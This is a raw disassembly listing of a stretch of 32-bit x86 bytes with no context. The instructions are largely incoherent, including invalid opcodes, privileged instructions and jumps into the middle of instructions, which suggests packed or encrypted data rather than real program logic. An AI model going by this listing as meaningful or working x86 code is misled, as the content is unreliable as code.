  41f334:	les    eax,FWORD PTR [ebp+0x2a765eeb]
  41f33a:	xor    DWORD PTR [edi+ecx*8-0x38],eax
  41f33e:	mov    cl,0x15
  41f341:	fimul  DWORD PTR [ebx-0x39167656]
  41f347:	bound  esp,QWORD PTR [ebx-0x22]
  41f34a:	dec    ebx
  41f34b:	jne    0x41f3b8
  41f34d:	popf   
  41f34e:	add    al,0x17
  41f350:	loope  0x41f3c6
  41f352:	(bad)  
  41f353:	push   ebx
  41f354:	mov    bl,0x9b
  41f356:	out    0x41,eax
  41f358:	test   al,0x2a
  41f35a:	lea    esp,[eax]
  41f35c:	xchg   edx,eax
  41f35d:	cs cmc 
  41f35f:	cmp    al,0x32
  41f361:	push   ecx
  41f362:	sub    DWORD PTR [edi+0x78c10133],edi
  41f368:	sbb    ebx,ebx
  41f36a:	xchg   edx,eax
  41f36b:	jnp    0x41f379
  41f36d:	leave  
  41f36e:	into   
  41f36f:	add    DWORD PTR [esi-0x6a093b8d],edi
  41f375:	xchg   ebp,eax
  41f376:	push   ds
  41f377:	mov    cl,0xc8
  41f379:	mov    ecx,0x7eb3cd1b
  41f37e:	push   es
  41f37f:	mov    ecx,0xf1176a25
  41f384:	push   ds
  41f385:	mov    eax,ds:0x564351d7
  41f38a:	test   eax,0x4c71ec97
  41f38f:	jbe    0x41f38b
  41f391:	jo     0x41f400
  41f393:	lods   eax,DWORD PTR ds:[esi]
  41f394:	sub    DWORD PTR [esp+edi*4],esi
  41f397:	adc    DWORD PTR [ecx+ebp*8],esp
  41f39a:	test   BYTE PTR [eax+0x2e],dh
  41f39d:	xchg   edx,eax
  41f39e:	sti    
  41f39f:	(bad)  
  41f3a0:	lea    eax,es:[edx+0x4e]
  41f3a4:	inc    eax
  41f3a5:	aam    0x54
  41f3a7:	and    al,0x3e
  41f3a9:	hlt    
  41f3aa:	ficom  WORD PTR [esi-0x39]
  41f3ad:	inc    esi
  41f3ae:	rcr    BYTE PTR [ebx+0x1dbb1cce],1
  41f3b4:	not    DWORD PTR [ecx]
  41f3b6:	ins    BYTE PTR es:[edi],dx
  41f3b7:	stc    
  41f3b8:	daa    
  41f3b9:	add    ecx,DWORD PTR [edx+edi*1+0x2ad09219]
  41f3c0:	xchg   ebx,eax
  41f3c1:	xchg   ebp,eax
  41f3c2:	inc    edx
  41f3c3:	mov    cl,cl
  41f3c5:	jle    0x41f3c4
  41f3c7:	jl     0x41f3cf
  41f3c9:	imul   edx,DWORD PTR [eax],0xfbe33869
  41f3cf:	shr    ch,cl
  41f3d1:	cmp    al,0x82
  41f3d3:	pusha  
  41f3d4:	add    al,BYTE PTR [edi+0x3fd2f53f]
  41f3da:	repnz icebp 
  41f3dc:	loop   0x41f424
  41f3de:	(bad)  
  41f3df:	int3   
  41f3e0:	ret    0xe27a
  41f3e3:	nop
  41f3e4:	pop    esi
  41f3e5:	xchg   DWORD PTR [edx],edi
  41f3e7:	mov    bl,0x29
  41f3e9:	aas    
  41f3ea:	js     0x41f410
  41f3ec:	and    eax,DWORD PTR [eax-0x2f54c1fd]
  41f3f2:	add    BYTE PTR [edx+edi*2+0x437c0b34],bl
  41f3f9:	xchg   esi,eax
  41f3fa:	sub    al,BYTE PTR [esi-0x13]
  41f3fd:	mov    eax,ds:0x8f84a796
  41f402:	add    DWORD PTR [ecx+eiz*1-0x1a],esp
  41f406:	pop    es
  41f407:	push   ss
  41f408:	mov    WORD PTR [esi+esi*8-0x3d],es
  41f40c:	pop    es
  41f40d:	add    BYTE PTR [esi+0x60],ah
  41f410:	push   cs
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0x0
  41f481:	repnz mov bh,dl
  41f484:	cmp    DWORD PTR [ebp+0x1],ecx
  41f487:	add    BYTE PTR ds:0x77000001,al
  41f48d:	jnp    0x41f433
  41f48f:	fcom   DWORD PTR cs:[eax-0x363129a5]
  41f496:	and    ah,bh
  41f498:	bound  ebp,QWORD PTR [ebx]
  41f49a:	xchg   edi,eax
  41f49b:	ds cli 
  41f49d:	xor    ah,BYTE PTR [ecx+0xf234b94]
  41f4a3:	and    edi,edi
  41f4a5:	cld    
  41f4a6:	inc    esi
  41f4a7:	(bad)  
  41f4a8:	sbb    al,BYTE PTR [ebp+0x3a]
  41f4ab:	xchg   BYTE PTR [eax-0x35],cl
  41f4ae:	xchg   DWORD PTR [ebp+0x73efd783],ebx
  41f4b4:	fbstp  TBYTE PTR [edx+eiz*4+0x1839a966]
  41f4bb:	les    ecx,FWORD PTR ds:0x3b422692
  41f4c1:	repnz imul dh
  41f4c4:	jne    0x41f49b
  41f4c6:	addr16 jbe 0x41f47c
  41f4c9:	sub    al,0x61
  41f4cb:	and    BYTE PTR [edx+0x63],bl
  41f4ce:	adc    eax,0x317efb6c
  41f4d3:	cmp    al,0xa5
  41f4d5:	in     al,dx
  41f4d6:	xor    ah,BYTE PTR [ebx-0x72]
  41f4d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4da:	jle    0x41f523
  41f4dc:	test   BYTE PTR [edx+0x18],bh
  41f4df:	fwait
  41f4e0:	loopne 0x41f473
  41f4e2:	xor    bl,BYTE PTR [eax-0x33]
  41f4e5:	sbb    BYTE PTR [edx],dl
  41f4e7:	jp     0x41f507
  41f4e9:	add    cl,BYTE PTR [edi+0x4e807a7f]
  41f4ef:	sbb    DWORD PTR [ebx+ebp*8-0x2b],eax
  41f4f3:	and    edx,edx
  41f4f5:	bound  ebp,QWORD PTR [ecx-0x8]
  41f4f8:	push   eax
  41f4f9:	out    0x16,eax
  41f4fb:	loope  0x41f517
  41f4fd:	add    cl,al
  41f4ff:	or     BYTE PTR [ebx],cl
  41f501:	push   es
  41f502:	mov    esi,0x29a84dd1
  41f507:	das    
  41f508:	les    ecx,FWORD PTR [ecx]
  41f50a:	cwde   
  41f50b:	push   ebp
  41f50c:	xor    esp,ebx
  41f50e:	(bad)  
  41f50f:	fst    QWORD PTR [esp+edi*2+0x9]
  41f513:	jo     0x41f4cf
  41f515:	pop    es
  41f516:	inc    ebx
  41f517:	fld    TBYTE PTR [esi-0x4b]
  41f51a:	mov    dh,0x14
  41f51c:	iret   
  41f51d:	push   ebx
  41f51e:	sub    eax,0x129a6f5e
  41f523:	ret    0x15bf
  41f526:	mov    cs,WORD PTR [ecx+esi*2-0x232032d1]
  41f52d:	arpl   bx,di
  41f52f:	adc    edi,DWORD PTR [ebp-0x349d1cfe]
  41f535:	xchg   ecx,eax
  41f536:	daa    
  41f537:	xor    cl,BYTE PTR [edi]
  41f539:	mul    DWORD PTR [edi]
  41f53b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f53c:	and    edi,edx
  41f53e:	mov    al,0xbb
  41f540:	arpl   WORD PTR [eax],bx
  41f542:	retf   
  41f543:	pop    ebp
  41f544:	cmp    edx,DWORD PTR [esi-0x70ae3425]
  41f54a:	xor    eax,0x1a0ac138
  41f54f:	sahf   
  41f550:	js     0x41f538
  41f552:	pop    edi
  41f553:	mov    BYTE PTR [esi-0x684db5a7],ah
  41f559:	mov    ah,0x9a
  41f55b:	addr16 test ebp,0x36bb6d0
  41f562:	pop    esi
  41f563:	xchg   edx,eax
  41f564:	and    esi,esp
  41f566:	inc    edi
  41f567:	cmp    al,0x13
  41f569:	xchg   ecx,eax
  41f56a:	dec    edx
  41f56b:	xor    DWORD PTR [esi-0x7e4ab820],0x7
  41f572:	loop   0x41f589
  41f574:	add    dl,BYTE PTR [ecx-0x3d]
  41f577:	dec    edi
  41f578:	mov    cl,0xf8
  41f57a:	xchg   ebp,eax
  41f57b:	xchg   esi,eax
  41f57c:	mov    cl,0x71
  41f57e:	dec    ebx
  41f57f:	dec    ecx
  41f580:	adc    DWORD PTR [ebp-0xc],edx
  41f583:	push   esi
  41f584:	rol    BYTE PTR [eax],cl
  41f586:	lock sbb DWORD PTR [esi-0x66],ebp
  41f58a:	jae    0x41f5ac
  41f58c:	cmp    al,0x84
  41f58e:	stos   DWORD PTR es:[edi],eax
  41f58f:	jp     0x41f5c3
	...
  41f5f1:	add    BYTE PTR [eax],al
  41f5f3:	add    BYTE PTR [eax+0x34],bh
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x1433:0x8c55d422
  41f604:	ds dec esi
  41f606:	add    DWORD PTR [eax],eax
  41f608:	add    eax,0x1000001
  41f60d:	shl    DWORD PTR [eax],0xb
  41f610:	xchg   ecx,eax
  41f611:	mov    ch,0x8f
  41f613:	and    al,0xb0
  41f615:	cwde   
  41f616:	adc    DWORD PTR [ebx-0x54],0xe49413c8
  41f61d:	add    al,0x8d
  41f61f:	adc    cl,BYTE PTR [eax+0x39]
  41f622:	loop   0x41f5cd
  41f624:	jp     0x41f5e6
  41f626:	loopne 0x41f60d
  41f628:	pop    esi
  41f629:	stos   BYTE PTR es:[edi],al
  41f62a:	repz add eax,0xc350e7f5
  41f630:	add    eax,0xd4678fe2
  41f635:	jecxz  0x41f67c
  41f637:	call   0x479d:0x42a6adc0
  41f63e:	(bad)  
  41f63f:	mov    ecx,0x67ad3f54
  41f644:	jge    0x41f66a
  41f646:	xchg   edi,eax
  41f647:	dec    ebx
  41f648:	test   esi,ebp
  41f64a:	aas    
  41f64b:	stos   DWORD PTR es:[edi],eax
  41f64c:	jle    0x41f648
  41f64e:	or     al,0x92
  41f650:	lds    esi,FWORD PTR [ebx+esi*4-0x44]
  41f654:	sub    DWORD PTR [ecx-0x29],0xffffff88
  41f658:	push   0x1
  41f65a:	ja     0x41f67a
  41f65c:	or     eax,0xbbf5e98d
  41f661:	jge    0x41f6c0
  41f663:	sbb    al,0x5b
  41f665:	or     DWORD PTR [ecx],eax
  41f667:	(bad)  
  41f668:	lock pop esp
  41f66a:	les    esi,FWORD PTR [edi+esi*4]
  41f66d:	clc    
  41f66e:	or     DWORD PTR [esi-0x60370d44],ebp
  41f674:	jge    0x41f5fa
  41f676:	push   esp
  41f677:	popf   
  41f678:	sub    dh,BYTE PTR [ecx+0x2]
  41f67b:	xor    al,0xa3
  41f67d:	mov    bh,0x56
  41f67f:	mov    dh,BYTE PTR [esp+eax*1-0x7c1a9c05]
  41f686:	dec    esp
  41f687:	or     eax,0x392aee35
  41f68c:	lods   al,BYTE PTR ds:[esi]
  41f68d:	rol    BYTE PTR ds:[ebx],1
  41f690:	hlt    
  41f691:	pop    esi
  41f692:	cwde   
  41f693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f694:	push   ds
  41f695:	lock sub ch,cl
  41f698:	pop    ecx
  41f699:	imul   ecx,DWORD PTR [edx],0xc4e733dc
  41f69f:	aas    
  41f6a0:	mov    ds:0xa7e6b10c,al
  41f6a5:	cmp    al,0x4f
  41f6a7:	mov    ebx,0xc338f1d7
  41f6ac:	loope  0x41f72c
  41f6ae:	fisubr DWORD PTR [eax]
  41f6b0:	fcom   QWORD PTR [edx+0x6e340e06]
  41f6b6:	inc    ebx
  41f6b7:	rol    esi,0x33
  41f6ba:	ret    0xa165
  41f6bd:	and    DWORD PTR [eax-0x76],0x24
  41f6c1:	gs pop esp
  41f6c3:	(bad)  
  41f6c4:	aas    
  41f6c5:	test   BYTE PTR [ebx-0x6d23b6f],bh
  41f6cb:	mov    bl,0xfc
  41f6cd:	inc    edx
  41f6ce:	stos   DWORD PTR es:[edi],eax
  41f6cf:	aaa    
  41f6d0:	loope  0x41f717
  41f6d2:	dec    edx
  41f6d3:	jmp    0x41f703
  41f6d5:	arpl   WORD PTR [ebx],bx
  41f6d7:	sbb    eax,0x6c878f72
  41f6dc:	push   edx
  41f6dd:	adc    DWORD PTR [esi-0x66f343c1],0x3b2252ab
  41f6e7:	out    0x44,al
  41f6e9:	(bad)  
  41f6eb:	fdivp  st(7),st
  41f6ed:	xor    DWORD PTR [ebp+0x3318f82b],esp
  41f6f3:	or     BYTE PTR [esp+ebx*8+0x37e0eb20],cl
  41f6fa:	in     al,dx
  41f6fb:	enter  0xaf9d,0x4b
  41f6ff:	mov    dl,cl
  41f701:	fcmove st,st(5)
  41f703:	scas   al,BYTE PTR es:[edi]
  41f704:	sbb    bl,bh
  41f706:	ja     0x41f764
  41f708:	lahf   
  41f709:	xchg   BYTE PTR [ebp+0x30c569c3],bl
  41f70f:	repnz xchg esi,eax
	...
  41f771:	add    BYTE PTR [eax],al
  41f773:	add    BYTE PTR [edx-0x5081dcc4],dl
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0xc821:0x4f6c62d2
  41f783:	dec    edi
  41f784:	inc    ebx
  41f785:	dec    edi
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    eax,0xc2000001
  41f78d:	cdq    
  41f78e:	sbb    esi,DWORD PTR [ebp+ebp*8+0x9dd1d90]
  41f795:	lds    eax,FWORD PTR [edi+0x693efe34]
  41f79b:	sub    eax,0xdcc048cd
  41f7a0:	mov    DWORD PTR [ebx-0xd],ecx
  41f7a3:	mov    ds:0x718a5928,al
  41f7a8:	adc    BYTE PTR [edi],dh
  41f7aa:	in     al,dx
  41f7ab:	inc    ecx
  41f7ac:	rol    BYTE PTR [edx+0x1c08f1ca],0x8a
  41f7b3:	jo     0x41f73c
  41f7b5:	js     0x41f78f
  41f7b7:	sahf   
  41f7b8:	mov    ah,0xfb
  41f7ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7bb:	sbb    DWORD PTR [ecx+ebx*2+0x5f4307d5],edx
  41f7c2:	sbb    esp,DWORD PTR [edi]
  41f7c4:	mov    edi,0x64a6d1a5
  41f7c9:	cmp    eax,0xfa2af818
  41f7ce:	pop    ds
  41f7cf:	mov    BYTE PTR [esi-0x50ae993f],ch
  41f7d5:	add    eax,0x2749da2
  41f7da:	adc    al,0x6f
  41f7dc:	xchg   ecx,eax
  41f7dd:	jae    0x41f773
  41f7df:	ret    
  41f7e0:	lods   al,BYTE PTR ds:[esi]
  41f7e1:	(bad)  
  41f7e2:	lock xchg edx,ebx
  41f7e5:	lahf   
  41f7e6:	daa    
  41f7e7:	mov    BYTE PTR ds:0xdee96e78,bh
  41f7ed:	ss dec esp
  41f7ef:	or     BYTE PTR [eax-0x280adbd],0x74
  41f7f6:	pop    es
  41f7f7:	repnz retf 0x2c97
  41f7fb:	leave  
  41f7fc:	aaa    
  41f7fd:	jmp    0x41f781
  41f7ff:	fs loope 0x41f798
  41f802:	pop    es
  41f803:	std    
  41f804:	mov    ebp,0x5b67a3f2
  41f80a:	lods   eax,DWORD PTR ss:[esi]
  41f80c:	jne    0x41f860
  41f80e:	jg     0x41f807
  41f810:	mov    cl,0xbb
  41f812:	pusha  
  41f813:	(bad)  
  41f814:	jae    0x41f7b5
  41f816:	jo     0x41f7dc
  41f818:	dec    esp
  41f819:	pop    ds
  41f81a:	jecxz  0x41f79f
  41f81c:	fldenv [eax]
  41f81e:	or     esp,DWORD PTR [ecx+edx*4+0x511f21f7]
  41f825:	and    al,0xd4
  41f827:	inc    eax
  41f828:	or     eax,0x76d9e751
  41f82d:	inc    edx
  41f82e:	and    bl,BYTE PTR [ebx]
  41f830:	dec    esi
  41f831:	or     DWORD PTR [edx+edi*8],0x48a868c2
  41f838:	in     eax,dx
  41f839:	adc    al,BYTE PTR [ebp+0x6ae0cac2]
  41f83f:	jle    0x41f844
  41f841:	cld    
  41f842:	push   cs
  41f843:	jbe    0x41f89a
  41f845:	inc    edx
  41f846:	push   0xffffffec
  41f848:	(bad)  
  41f849:	rol    BYTE PTR [eax],1
  41f84b:	sbb    dl,BYTE PTR [edx-0x7d1dfd75]
  41f851:	pop    ebp
  41f852:	xor    eax,0x38e08bc5
  41f857:	shr    DWORD PTR [esi-0x7feb4cee],cl
  41f85d:	xchg   ecx,eax
  41f85e:	in     al,0xf2
  41f860:	daa    
  41f861:	rcr    DWORD PTR [ebx+0x26fa4eab],0x29
  41f868:	lock out dx,al
  41f86a:	iret   
  41f86b:	add    DWORD PTR [bx],ecx
  41f86e:	fnstenv [esi-0x23722b45]
  41f874:	inc    ecx
  41f875:	pushf  
  41f876:	scas   eax,DWORD PTR es:[edi]
  41f877:	dec    edx
  41f878:	xlat   BYTE PTR ds:[ebx]
  41f879:	(bad)  
  41f87a:	scas   al,BYTE PTR es:[edi]
  41f87b:	jbe    0x41f875
  41f87d:	xor    BYTE PTR [edx],bl
  41f87f:	pop    edx
  41f880:	fidivr DWORD PTR [eax+0x14a654d6]
  41f886:	js     0x41f8d2
  41f888:	add    eax,0x1b538fce
  41f88d:	loopne 0x41f8bd
  41f88f:	ret    
  41f890:	sub    al,BYTE PTR [eax]
	...
  41f8f2:	add    BYTE PTR [eax],al
  41f8f4:	mov    eax,ds:0x3b920b9a
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	fdivr  QWORD PTR [edi+0x50480d0c]
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    eax,0x9f000001
  41f90d:	jmp    0x41f8ca
  41f90f:	test   BYTE PTR [edx+0x5],bl
  41f912:	jbe    0x41f926
  41f914:	inc    ecx
  41f915:	cmc    
  41f916:	enter  0x42f,0xcf
  41f91a:	loopne 0x41f971
  41f91c:	sbb    dl,BYTE PTR [eax-0xd38fe6e]
  41f922:	add    al,0x5c
  41f924:	sbb    BYTE PTR ds:0x19c5a470,al
  41f92a:	jo     0x41f98d
  41f92c:	jle    0x41f991
  41f92e:	or     DWORD PTR [edi],eax
  41f930:	dec    esp
  41f931:	xchg   BYTE PTR [ecx],al
  41f933:	sahf   
  41f934:	bound  eax,QWORD PTR [esi+ecx*4]
  41f937:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f938:	or     eax,0x4194a334
  41f93d:	jle    0x41f996
  41f93f:	mov    esp,0xbf68a5e6
  41f944:	mov    eax,ds:0xcaf5294d
  41f949:	jo     0x41f9c6
  41f94b:	scas   eax,DWORD PTR es:[edi]
  41f94c:	and    BYTE PTR [ebp+0x113959d1],al
  41f952:	rol    DWORD PTR [esi+0x43d25f4],1
  41f958:	out    0xd1,al
  41f95a:	out    dx,al
  41f95b:	iret   
  41f95c:	jl     0x41f988
  41f95e:	addr16 aaa 
  41f960:	inc    esp
  41f961:	mov    ch,0x36
  41f963:	adc    di,WORD PTR [esi]
  41f966:	mov    cl,0xae
  41f968:	xchg   esp,eax
  41f969:	or     al,0x4e
  41f96b:	inc    edx
  41f96c:	pop    ecx
  41f96d:	addr16 jge 0x41f93f
  41f970:	rol    ecx,1
  41f972:	xchg   esi,eax
  41f973:	pop    ss
  41f974:	in     eax,dx
  41f975:	push   esp
  41f976:	xchg   DWORD PTR [ebx+0x25b9ecdc],esp
  41f97c:	mov    BYTE PTR [eax],bl
  41f97e:	cmp    dl,BYTE PTR [edi]
  41f980:	icebp  
  41f981:	add    al,0x48
  41f983:	shl    BYTE PTR [ecx],0x1f
  41f986:	nop
  41f987:	push   0xa996fe96
  41f98c:	cmp    esi,ebp
  41f98e:	cwde   
  41f98f:	in     eax,dx
  41f990:	mov    ah,BYTE PTR [ebp+0x9bb4432]
  41f996:	int3   
  41f997:	pop    eax
  41f998:	add    cl,BYTE PTR [esi-0x394d3e6b]
  41f99e:	fidivr WORD PTR [esi+0x4de52f3]
  41f9a4:	shl    BYTE PTR [ebx],cl
  41f9a6:	jp     0x41f960
  41f9a8:	dec    ebx
  41f9a9:	lods   eax,DWORD PTR ds:[esi]
  41f9aa:	and    DWORD PTR [edx+ebp*8+0x767c3229],0xf1928fc0
  41f9b5:	popa   
  41f9b6:	jmp    0x41f9bf
  41f9b8:	cmp    eax,0xc04ed8d
  41f9bd:	clc    
  41f9be:	mov    dh,bl
  41f9c0:	jg     0x41f978
  41f9c2:	mov    ebp,ebx
  41f9c4:	cmp    bh,BYTE PTR [ebx-0x2c]
  41f9c7:	aaa    
  41f9c8:	add    al,0x55
  41f9ca:	and    al,0x60
  41f9cc:	add    eax,0x98866da5
  41f9d1:	and    edi,ecx
  41f9d3:	dec    esi
  41f9d4:	(bad)  
  41f9d5:	xchg   ebp,eax
  41f9d6:	cmc    
  41f9d7:	shl    bh,1
  41f9d9:	cwde   
  41f9da:	ss test cl,ah
  41f9dd:	jb     0x41f9b9
  41f9df:	push   esi
  41f9e0:	cmp    eax,0xe43c9b2f
  41f9e5:	aad    0x59
  41f9e7:	add    eax,0x90b4d4a5
  41f9ec:	popa   
  41f9ed:	mov    cl,ah
  41f9ef:	fsubr  QWORD PTR [esi+0x6e4508ee]
  41f9f5:	pop    ds
  41f9f6:	dec    eax
  41f9f7:	add    bl,dh
  41f9f9:	inc    eax
  41f9fa:	cmp    ebx,DWORD PTR [esi+0x477ad6a8]
  41fa00:	mov    ebx,0x352ed724
  41fa05:	iret   
  41fa06:	clc    
  41fa07:	aas    
  41fa08:	retf   
  41fa09:	fs inc ecx
  41fa0b:	pop    ecx
  41fa0c:	pop    edx
  41fa0d:	test   DWORD PTR [ecx+0x1319],esp
	...
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x210e2915,eax
  41fa83:	mov    ebx,0x1514d
  41fa88:	add    eax,0x8e000001
  41fa8d:	cmp    al,0x5e
  41fa8f:	adc    eax,0x4d5ed731
  41fa94:	ret    0xd3aa
  41fa97:	sub    DWORD PTR [eax-0x2a6ed06d],esp
  41fa9d:	nop
  41fa9e:	cmp    edx,edx
  41faa0:	pop    edx
  41faa1:	mov    dh,0xdf
  41faa3:	daa    
  41faa4:	or     eax,0xbe2d3848
  41faa9:	sbb    eax,0x721194d
  41faae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41faaf:	repnz fst DWORD PTR [ebx-0x77]
  41fab3:	test   eax,0x8e1cc3c7
  41fab8:	xchg   edi,eax
  41fab9:	push   edx
  41faba:	lock or edi,DWORD PTR [esi+edx*2]
  41fabe:	xchg   edx,eax
  41fabf:	mov    eax,ds:0xfba896b8
  41fac4:	popa   
  41fac5:	mov    ebp,0x6fb0ad09
  41faca:	imul   ecx,edx,0x622a49e6
  41fad0:	retf   
  41fad1:	or     eax,0xa3473f8
  41fad6:	imul   ebx,DWORD PTR [edx+0x659122a5],0xfffffffb
  41fadd:	jl     0x41fa82
  41fadf:	add    DWORD PTR [edx+0x64],esp
  41fae2:	adc    dl,bl
  41fae4:	pop    es
  41fae5:	mov    al,ds:0xea2d5143
  41faea:	enter  0x78ef,0x4
  41faee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faef:	je     0x41faa5
  41faf1:	xchg   edi,eax
  41faf2:	lods   al,BYTE PTR ds:[esi]
  41faf3:	fisubr WORD PTR [eax-0x19abbbad]
  41faf9:	sbb    BYTE PTR [ebx+0x62216b65],cl
  41faff:	fisttp WORD PTR gs:[edx+0x1f81fb3a]
  41fb06:	mov    ebx,0x4e6c93dd
  41fb0b:	stc    
  41fb0c:	push   edx
  41fb0d:	pop    ebp
  41fb0e:	into   
  41fb0f:	sub    DWORD PTR [esi+0x297a5b45],edi
  41fb15:	icebp  
  41fb16:	inc    ebp
  41fb17:	mov    edx,0xabc9fb3f
  41fb1c:	or     DWORD PTR [edx+0x64fa9331],ebp
  41fb22:	lods   eax,DWORD PTR ds:[esi]
  41fb23:	or     esp,ecx
  41fb25:	push   ss
  41fb26:	jb     0x41faab
  41fb28:	fild   QWORD PTR [esi+0x79551a68]
  41fb2e:	adc    eax,DWORD PTR [ecx+0x7c]
  41fb31:	mov    cl,0xa2
  41fb33:	pop    esp
  41fb34:	bound  edi,QWORD PTR [ecx+ecx*1]
  41fb37:	fsubr  QWORD PTR [eax+esi*8]
  41fb3a:	sub    BYTE PTR [ecx-0x24],cl
  41fb3d:	mov    esp,0x5ba3c818
  41fb42:	mov    eax,ds:0x9432edd3
  41fb47:	test   eax,0x2b4b7702
  41fb4c:	xor    al,0x60
  41fb4e:	mov    WORD PTR [ebx-0x1982efa9],?
  41fb54:	fwait
  41fb55:	pop    esp
  41fb56:	cmc    
  41fb57:	addr16 pop ds
  41fb59:	out    0xc4,al
  41fb5b:	dec    ebp
  41fb5c:	hlt    
  41fb5d:	add    eax,0x91792507
  41fb62:	and    BYTE PTR [esi+0x6d],cl
  41fb65:	and    al,0x47
  41fb67:	sub    eax,0xd3aa81cd
  41fb6c:	adc    DWORD PTR [edi+edi*1+0x45],edx
  41fb70:	in     eax,dx
  41fb71:	pushf  
  41fb72:	jge    0x41fba0
  41fb74:	mov    ds:0x92070ff6,al
  41fb79:	bound  edx,QWORD PTR [esi]
  41fb7b:	(bad)  
  41fb7c:	mov    cl,0x43
  41fb7e:	or     BYTE PTR [esp+ebx*4],cl
  41fb81:	inc    ebx
  41fb82:	inc    ecx
  41fb83:	or     al,0x1b
  41fb85:	mov    ds:0xb3c59a88,al
  41fb8a:	mov    ds:0xabff5435,eax
  41fb8f:	cmp    BYTE PTR [eax+eax*1+0x0],dh
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	call   0x5276993b
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0x5c000001
  41fc0d:	mov    esi,0x63ad2663
  41fc12:	jns    0x41fc22
  41fc14:	aam    0x99
  41fc16:	jecxz  0x41fbe4
  41fc18:	xchg   ebp,eax
  41fc19:	retf   
  41fc1a:	(bad)  [eax]
  41fc1c:	add    ecx,DWORD PTR [edi]
  41fc1e:	push   es
  41fc1f:	test   DWORD PTR [esi],edx
  41fc21:	pop    esi
  41fc22:	pushf  
  41fc23:	pop    edi
  41fc24:	cmp    ch,bh
  41fc26:	mov    ebp,0xd26c038d
  41fc2b:	sahf   
  41fc2c:	and    bl,BYTE PTR [ecx+0x26cb27cc]
  41fc32:	fnstsw WORD PTR [esi+ecx*4]
  41fc35:	(bad)  
  41fc36:	mov    WORD PTR [eax+0x640b4cc0],ds
  41fc3c:	test   BYTE PTR [edi],al
  41fc3e:	arpl   WORD PTR [ecx-0x3b7c00b7],dx
  41fc44:	xchg   esi,eax
  41fc45:	push   ebx
  41fc46:	imul   esp,DWORD PTR [esi],0x98b0a7aa
  41fc4c:	xchg   ebx,eax
  41fc4d:	mov    ah,0x74
  41fc4f:	mov    al,ds:0x7a6d54fc
  41fc54:	aam    0xd8
  41fc56:	mov    edx,0x21517254
  41fc5b:	dec    edx
  41fc5c:	rcl    BYTE PTR [edi],1
  41fc5e:	jae    0x41fcaa
  41fc60:	lds    ecx,FWORD PTR [esi+0x330a8d29]
  41fc66:	mov    gs,WORD PTR [ebp+esi*4+0x333ddbe1]
  41fc6d:	dec    ebp
  41fc6e:	dec    ebx
  41fc6f:	pop    es
  41fc70:	pop    ecx
  41fc71:	aad    0x86
  41fc73:	push   DWORD PTR [eax]
  41fc75:	cwde   
  41fc76:	lahf   
  41fc77:	push   esi
  41fc78:	push   ss
  41fc79:	and    eax,0xba4e3668
  41fc7e:	mov    edi,DWORD PTR ds:0x61653368
  41fc84:	loope  0x41fc3b
  41fc86:	(bad)  
  41fc87:	mov    bh,cl
  41fc89:	inc    eax
  41fc8a:	pop    ecx
  41fc8b:	cwde   
  41fc8c:	push   ecx
  41fc8d:	(bad)  
  41fc8e:	ins    DWORD PTR es:[edi],dx
  41fc8f:	adc    eax,0x12c63b80
  41fc94:	and    eax,0xb3bdebea
  41fc99:	test   BYTE PTR [ecx+0x18],ah
  41fc9c:	dec    ebp
  41fc9d:	mov    esp,0x9d92c470
  41fca2:	sar    DWORD PTR [edi-0xf2a0643],cl
  41fca8:	int3   
  41fca9:	push   esp
  41fcaa:	xor    DWORD PTR [edx+0x47ea1009],ebx
  41fcb0:	push   esp
  41fcb1:	jmp    0x41fccf
  41fcb3:	mov    ecx,0x84aa41d0
  41fcb8:	out    0xac,al
  41fcba:	cld    
  41fcbb:	adc    al,0xf7
  41fcbd:	int    0x71
  41fcbf:	add    DWORD PTR [ebx],edi
  41fcc1:	scas   eax,DWORD PTR es:[edi]
  41fcc2:	xchg   ebp,eax
  41fcc3:	(bad)  
  41fcc4:	shl    DWORD PTR [ecx],cl
  41fcc6:	ds fstp st(4)
  41fcc9:	cli    
  41fcca:	jle    0x41fc59
  41fccc:	(bad)  
  41fcce:	fild   WORD PTR [ebp+0x623ff070]
  41fcd4:	aad    0xe5
  41fcd6:	inc    edi
  41fcd7:	add    BYTE PTR [eax-0x45],dh
  41fcda:	pop    ebp
  41fcdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fcdc:	dec    ecx
  41fcdd:	inc    eax
  41fcde:	test   BYTE PTR [edi-0x3d],dl
  41fce1:	xor    al,0x19
  41fce3:	jne    0x41fd4e
  41fce5:	push   es
  41fce6:	in     eax,0xad
  41fce8:	out    dx,eax
  41fce9:	mov    ecx,DWORD PTR es:[esp+ecx*1-0x2560dabd]
  41fcf1:	jns    0x41fd29
  41fcf3:	inc    edi
  41fcf4:	xor    DWORD PTR [ebx+0x39],esp
  41fcf7:	mov    edi,0xd1ddafee
  41fcfc:	inc    esi
  41fcfd:	mov    cl,0x2e
